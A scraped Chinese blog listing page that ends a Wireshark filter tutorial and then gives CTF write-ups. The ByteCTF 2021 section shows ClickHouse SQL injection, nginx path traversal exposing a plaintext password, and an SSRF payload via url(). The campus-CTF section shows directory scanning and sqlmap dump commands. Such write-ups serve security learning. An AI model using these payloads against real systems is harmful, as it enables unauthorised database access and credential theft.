<p>捕获过滤器表达式没有像显示过滤器表达式那样明显的规律，但写法不多所以也不难；而且除非全部捕获要占用的磁盘空间实现太大，且你非常明确过滤掉的数据包是你不需要的，不然一般都不用捕获过滤器表达式而用显示过滤器表达式。</p>
<p>在wireshark2.x版本，启动后欢迎界面即有捕获过滤器，在其中输入过滤表达式开始捕获数据包时即会生效：</p>
<p><img src="https://images2018.cnblogs.com/blog/1116722/201807/1116722-20180703140004686-144508212.png" alt="img"></p>
<p>点击图中“书签”标志，再点管理“捕获筛选器”，即可看到常用捕获过滤表达示的书写形式</p>
<p><img src="https://images2018.cnblogs.com/blog/1116722/201807/1116722-20180703140241625-1672020915.png" alt="img"></p>
<p><img src="https://images2018.cnblogs.com/blog/1116722/201807/1116722-20180703140426412-789752503.png" alt="img"></p>
<h2 id="四、显示过滤器表达示及其书写规律"><a href="#四、显示过滤器表达示及其书写规律" class="headerlink" title="四、显示过滤器表达示及其书写规律"></a>四、显示过滤器表达示及其书写规律</h2><p>显示过滤器表达式作用在在wireshark捕获数据包之后，从已捕获的所有数据包中显示出符合条件的数据包，隐藏不符合条件的数据包。</p>
<p>显示过滤表达示在工具栏下方的“显示过滤器”输入框输入即可生效</p>
<p><img src="https://images2018.cnblogs.com/blog/1116722/201807/1116722-20180703140933271-1913719875.png" alt="img"></p>
<h3 id="4-1-基本过滤表达式"><a href="#4-1-基本过滤表达式" class="headerlink" title="4.1 基本过滤表达式"></a>4.1 基本过滤表达式</h3><p>一条基本的表达式由过滤项、过滤关系、过滤值三项组成。</p>
<p>比如ip.addr == 192.168.1.1，这条表达式中ip.addr是过滤项、==是过滤关系，192.168.1.1是过滤值（整条表达示的意思是找出所有ip协议中源或目标ip、等于、192.168.1.1的数据包）</p>
<h4 id="4-1-1-过滤项"><a href="#4-1-1-过滤项" class="headerlink" title="4.1.1 过滤项"></a>4.1.1 过滤项</h4><p>初学者感觉的“过滤表达式复杂”，最主要就是在这个过滤项上：一是不知道有哪些过滤项，二是不知道过滤项该怎么写。</p>
<p>这两个问题有一个共同的答案—–wireshark的过滤项是“协议“+”.“+”协议字段”的模式。以端口为例，端口出现于tcp协议中所以有端口这个过滤项且其写法就是tcp.port。</p>
<p>推广到其他协议，如eth、ip、udp、http、telnet、ftp、icmp、snmp等等其他协议都是这么个书写思路。当然wireshark出于缩减长度的原因有些字段没有使用协议规定的名称而是使用简写（比如Destination Port在wireshark中写为dstport）又出于简使用增加了一些协议中没有的字段（比如<a target="_blank" rel="noopener" href="http://www.faqs.org/rfcs/rfc793.html">tcp协议</a>只有源端口和目标端口字段，为了简便使用wireshark增加了tcp.port字段来同时代表这两个），但思路总的算是不变的。而且在实际使用时我们输入“协议”+“.”wireshark就会有支持的字段提示（特别是过滤表达式字段的首字母和wireshark在上边2窗口显示的字段名称首字母通常是一样的），看下名称就大概知道要用哪个字段了。wireshark支持的全部协议及协议字段可查看<a target="_blank" rel="noopener" href="https://www.wireshark.org/docs/dfref/">官方说明</a>。</p>
<h4 id="4-1-2-过滤关系"><a href="#4-1-2-过滤关系" class="headerlink" title="4.1.2 过滤关系"></a>4.1.2 过滤关系</h4><p>过滤关系就是大于、小于、等于等几种等式关系，我们可以直接看<a target="_blank" rel="noopener" href="https://www.wireshark.org/docs/wsug_html/#DispCompOps">官方给出的表</a>。注意其中有“English”和“C-like”两个字段，这个意思是说“English”和“C-like”这两种写法在wireshark中是等价的、都是可用的。</p>
<p><img src="https://images2018.cnblogs.com/blog/1116722/201807/1116722-20180702202505080-625744837.png" alt="img"></p>
<h4 id="4-1-3-过滤值"><a href="#4-1-3-过滤值" class="headerlink" title="4.1.3 过滤值"></a>4.1.3 过滤值</h4><p>过滤值就是设定的过滤项应该满足过滤关系的标准，比如500、5000、50000等等。过滤值的写法一般已经被过滤项和过滤关系设定好了，只是填下自己的期望值就可以了。</p>
<h3 id="4-2-复合过滤表达示"><a href="#4-2-复合过滤表达示" class="headerlink" title="4.2 复合过滤表达示"></a>4.2 复合过滤表达示</h3><p>所谓复合过滤表达示，就是指由多条基本过滤表达式组合而成的表达示。基本过滤表达式的写法还是不变的，复合过滤表达示多出来的东西就只是基本过滤表达示的“连接词”</p>
<p>我们依然直接参照<a target="_blank" rel="noopener" href="https://www.wireshark.org/docs/wsug_html/#FiltLogOps">官方给出的表</a>，同样“English”和“C-like”这两个字段还是说明这两种写法在wireshark中是等价的、都是可用的。</p>
<p><img src="https://images2018.cnblogs.com/blog/1116722/201807/1116722-20180702202925687-486659346.png" alt="img"></p>
<h3 id="4-3-常见用显示过滤需求及其对应表达式"><a href="#4-3-常见用显示过滤需求及其对应表达式" class="headerlink" title="4.3 常见用显示过滤需求及其对应表达式"></a>4.3 常见用显示过滤需求及其对应表达式</h3><p>数据链路层：</p>
<p>筛选mac地址为04:f9:38:ad:13:26的数据包—-eth.src == 04:f9:38:ad:13:26</p>
<p>筛选源mac地址为04:f9:38:ad:13:26的数据包—-eth.src == 04:f9:38:ad:13:26</p>
<p>网络层：</p>
<p>筛选ip地址为192.168.1.1的数据包—-ip.addr == 192.168.1.1</p>
<p>筛选192.168.1.0网段的数据—- ip contains “192.168.1”</p>
<p>筛选192.168.1.1和192.168.1.2之间的数据包—-ip.addr == 192.168.1.1 &amp;&amp; ip.addr == 192.168.1.2</p>
<p>筛选从192.168.1.1到192.168.1.2的数据包—-ip.src == 192.168.1.1 &amp;&amp; ip.dst == 192.168.1.2</p>
<p>传输层：</p>
<p>筛选tcp协议的数据包—-tcp</p>
<p>筛选除tcp协议以外的数据包—-!tcp</p>
<p>筛选端口为80的数据包—-tcp.port == 80</p>
<p>筛选12345端口和80端口之间的数据包—-tcp.port == 12345 &amp;&amp; tcp.port == 80</p>
<p>筛选从12345端口到80端口的数据包—-tcp.srcport == 12345 &amp;&amp; tcp.dstport == 80</p>
<p>应用层：</p>
<p>特别说明—-http中http.request表示请求头中的第一行（如GET index.jsp HTTP/1.1），http.response表示响应头中的第一行（如HTTP/1.1 200 OK），其他头部都用http.header_name形式。</p>
<p>筛选url中包含.php的http数据包—-http.request.uri contains “.php”</p>
<p>筛选内容包含username的http数据包—-http contains “username”</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/10/19/2021bytectf%E5%A4%8D%E7%8E%B0/">2021bytectf复现</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-10-19</time><div class="content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本来想打的（虽然自己很菜），但是周末有校赛，被拉过去凑数了没办法，后面来复现学习一下</p>
<h2 id="double-sqli"><a href="#double-sqli" class="headerlink" title="double sqli"></a>double sqli</h2><p>输入单引号有报错信息,搜索了一下报错信息，发现是clickhouse下的sql</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211019173922.png" alt="img" style="zoom:67%;">
这里查到了clickhouse下sql使用的手册，直接使用union就可以实现联合注入，并且是数字型注入

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 union all select user()</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211019181636.png" alt="img" style="zoom:67%;">

<p>但是啥也没有抓包一下，发现是nginx服务器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;2时</span><br></pre></td></tr></table></figure>

<p>然后看到有个file，又是nginx服务器，有个目录穿越的漏洞：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_41924764/article/details/113362883">https://blog.csdn.net/weixin_41924764/article/details/113362883</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;flies..&#x2F;</span><br></pre></td></tr></table></figure>

<p>接下来就是去看看有没有sql配置文件看看里面的信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;39.105.175.150:30001&#x2F;files..&#x2F;var&#x2F;lib&#x2F;clickhouse&#x2F;access&#x2F;</span><br></pre></td></tr></table></figure>

<p>下载userlist和另外两个sql配置文件可以发现，存在另一个user用户<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211019184012.png" alt="img" style="zoom:67%;"></p>
<p>发现存在着另一个用户的密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ATTACH USER user_01 IDENTIFIED WITH plaintext_password BY &#39;e3b0c44298fc1c149afb&#39;;</span><br><span class="line">ATTACH GRANT SELECT ON ctf.* TO user_01;</span><br></pre></td></tr></table></figure>

<p>然后要怎么登陆呢？<br>使用另一个用户登陆mysql，那就需要ssrf<br>查了一下 发现clickhouse中的sql可以使用url()来执行http协议，并且clickhouse中的http协议可以实现sql语句的使用实现ssrf</p>
<p><a target="_blank" rel="noopener" href="https://clickhouse.com/docs/zh/sql-reference/table-functions/url/">https://clickhouse.com/docs/zh/sql-reference/table-functions/url/</a></p>
<p><a target="_blank" rel="noopener" href="https://clickhouse.com/docs/zh/interfaces/http/">https://clickhouse.com/docs/zh/interfaces/http/</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.deteact.com/yandex-clickhouse-injection/">https://blog.deteact.com/yandex-clickhouse-injection/</a></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211019185217.png" alt="img" style="zoom:67%;">



<p>这个是个例子，根据这个例子我们可以构造一下试试看</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1 union all select * from url(&#39;http:&#x2F;&#x2F;127.0.0.1:8123&#x2F;?query&#x3D;select+*+from+ctf.flag&amp;user&#x3D;user_01&amp;password&#x3D;e3b0c44298fc1c149afb&#39;,Values, &#39;column1 String&#39;)</span><br></pre></td></tr></table></figure>

<p>这样就可以了，主要是读文档的能力吧</p>
<h2 id="Unsecure-Blog"><a href="#Unsecure-Blog" class="headerlink" title="Unsecure Blog"></a>Unsecure Blog</h2><p>该blog是基于Jfinal框架进行二次开发的，在应用启动除发现存在全局的securitymanager，并且做了一些限制</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/10/18/2021%E6%A0%A1%E8%B5%9B/">2021校赛</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-10-18</time><div class="content"><h2 id="web-1"><a href="#web-1" class="headerlink" title="web-1"></a>web-1</h2><p>题目地址:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">172.31.65.173:80 </span><br></pre></td></tr></table></figure>

<p>翻了一下robots.txt，抓了一下包，都没有什么有用信息，那就是需要扫描目录了，使用dirsearch扫描工具进行扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u &quot;http:&#x2F;&#x2F;172.31.65.173&#x2F;&quot;</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211018192539.png" alt="img" style="zoom:67%;">

<p>发现有一个js目录<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211018192612.png" alt="img" style="zoom:67%;"><br>点进去以后即可看到源码<br>看到可疑源码，这是<strong>aaencode编码</strong>，搜索一下解码网站进行解码即可</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ [&#x27;_&#x27;]; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: &#x27;_&#x27; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +&#x27;_&#x27;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &#x27;_&#x27;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +&#x27;_&#x27;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +&#x27;_&#x27;) [c^_^o];(ﾟДﾟ) [&#x27;c&#x27;] = ((ﾟДﾟ)+&#x27;_&#x27;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&#x27;o&#x27;] = ((ﾟДﾟ)+&#x27;_&#x27;) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [&#x27;c&#x27;]+(ﾟДﾟ) [&#x27;o&#x27;]+(ﾟωﾟﾉ +&#x27;_&#x27;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +&#x27;_&#x27;) [ﾟｰﾟ] + ((ﾟДﾟ) +&#x27;_&#x27;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&#x27;c&#x27;]+((ﾟДﾟ)+&#x27;_&#x27;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&#x27;o&#x27;]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ];(ﾟДﾟ) [&#x27;_&#x27;] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&#x27;_&#x27;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&#x27;_&#x27;) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=&#x27;\\&#x27;; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +&#x27;_&#x27;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]=&#x27;\&quot;&#x27;;(ﾟДﾟ) [&#x27;_&#x27;] ( (ﾟДﾟ) [&#x27;_&#x27;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&#x27;_&#x27;)</span><br></pre></td></tr></table></figure>

<p>使用<a target="_blank" rel="noopener" href="https://www.qtool.net/decode%E8%BF%99%E4%B8%AA%E7%BD%91%E5%9D%80%E5%B0%B1%E5%8F%AF%E4%BB%A5%E8%A7%A3%E7%A0%81%E4%BA%86">https://www.qtool.net/decode这个网址就可以解码了</a></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211018192401.png" alt="img" style="zoom:67%;">



<h2 id="web-2"><a href="#web-2" class="headerlink" title="web-2"></a>web-2</h2><p>题目地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">172.31.65.174:80</span><br></pre></td></tr></table></figure>

<p>一开始一个搜索框，考点就那几个sql，ssti，命令执行…，先试试单引号，发现报错了<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211018192355.png" alt="img" style="zoom:67%;"></p>
<p>发现报错了<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211018192358.png" alt="img" style="zoom:67%;"><br>所以是sql报错注入，可以直接使用sqlmap去跑就好了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;172.31.65.174&#x2F;search.jsp?keyname&#x3D;&quot; --dbs</span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;172.31.65.174&#x2F;search.jsp?keyname&#x3D;&quot; -D attackdb --tables</span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;172.31.65.174&#x2F;search.jsp?keyname&#x3D;&quot; -D attackdb --tables -T db_news</span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;172.31.65.174&#x2F;search.jsp?keyname&#x3D;&quot; -D attackdb --tables -T db_news --columns</span><br><span class="line">qlmap -u &quot;http:&#x2F;&#x2F;172.31.65.174&#x2F;search.jsp?keyname&#x3D;&quot; -D attackdb --tables -T db_news --columns -C flag --dump</span><br></pre></td></tr></table></figure>

